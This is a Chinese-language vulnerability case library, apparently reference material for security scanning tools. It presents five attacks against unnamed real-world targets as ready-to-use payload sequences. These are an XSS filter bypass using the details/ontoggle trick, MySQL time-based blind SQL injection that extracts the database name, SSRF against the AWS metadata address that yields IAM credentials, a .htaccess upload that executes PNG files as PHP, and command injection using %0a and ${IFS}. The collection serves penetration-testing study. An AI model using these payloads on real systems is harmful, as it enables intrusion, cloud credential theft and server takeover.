# 真实漏洞案例库

## 案例1: XSS绕过WAF实例

### 目标环境

- 目标: 某电商平台商品评论功能
- WAF: 云WAF + 本地ModSecurity
- 过滤规则: `<script>`, `onerror`, `onload`, `alert`, `eval`

### 绕过过程

1. **第一轮尝试**: `<script>alert(1)</script>` → 被拦截
2. **第二轮尝试**: `<img src=x onerror=alert(1)>` → 被拦截
3. **第三轮尝试**: `<svg/onload=alert(1)>` → 被拦截
4. **成功绕过**: `<details open ontoggle=alert(1)>` → 执行成功

### 关键知识点

- HTML5新标签可绕过旧规则
- `ontoggle` 事件较少被过滤
- 组合测试优于单一Payload

### 对应工具

- xss\_scan

***

## 案例2: SQL注入时间盲注

### 目标环境

- 目标: 某CMS登录接口
- 参数: `username`
- 数据库: MySQL 5.7
- 错误回显: 关闭

### 检测过程

1. `admin' AND SLEEP(5)--` → 响应延迟5秒
2. `admin' AND IF(1=1,SLEEP(3),0)--` → 响应延迟3秒
3. 逐步提取数据库名: `AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(3),0)--`

### 关键知识点

- 时间盲注适用于无回显场景
- `SLEEP()` 和 `BENCHMARK()` 均可利用
- 需要多次请求确认

### 对应工具

- sqli\_scan

***

## 案例3: SSRF读取云元数据

### 目标环境

- 目标: 某图片处理服务
- 参数: `image_url`
- 云平台: AWS

### 攻击过程

1. `http://169.254.169.254/latest/meta-data/` → 返回元数据目录
2. `http://169.254.169.254/latest/meta-data/iam/security-credentials/` → 获取角色名
3. `http://169.254.169.254/latest/meta-data/iam/security-credentials/角色名` → 获取临时凭证

### 关键知识点

- 云元数据地址固定: `169.254.169.254`
- AWS/阿里云/GCP元数据路径不同
- 可导致云资源完全接管

### 对应工具

- ssrf\_scan

***

## 案例4: 文件上传绕过

### 目标环境

- 目标: 某企业OA系统头像上传
- 限制: 仅允许jpg/png/gif
- 后端: PHP + Apache

### 绕过过程

1. 直接上传 `.php` → 被拦截
2. 修改 `Content-Type: image/jpeg` → 被拦截
3. 双扩展名 `shell.php.jpg` → 被拦截
4. `.htaccess` 上传 + `shell.png` → 成功执行

### .htaccess 内容

```
AddType application/x-httpd-php .png
```

### 关键知识点

- Apache 配置文件可被利用
- 图片马 + 解析漏洞组合
- 服务器配置审计重要

### 对应工具

- fileupload\_scan

***

## 案例5: 命令注入管道符绕过

### 目标环境

- 目标: 某网络设备诊断功能
- 参数: `host`
- 过滤: 空格、`;`、`|`

### 绕过过程

1. `127.0.0.1; id` → 被拦截
2. `127.0.0.1|id` → 被拦截
3. `127.0.0.1%0aid` → 成功执行（换行符绕过）
4. `127.0.0.1${IFS}id` → 成功执行（IFS变量替代空格）

### 关键知识点

- 换行符 `%0a` 常被忽略
- `$IFS` 变量可替代空格
- 编码绕过是常用技巧

### 对应工具

- cmdi\_scan

***

## 案例应用建议

1. **扫描前分析**: 了解目标技术栈，选择合适案例参考
2. **组合测试**: 单一Payload成功率低，应多角度尝试
3. **日志分析**: 失败请求的响应可能揭示过滤规则
4. **持续更新**: 新绕过技术不断出现，知识库需定期更新

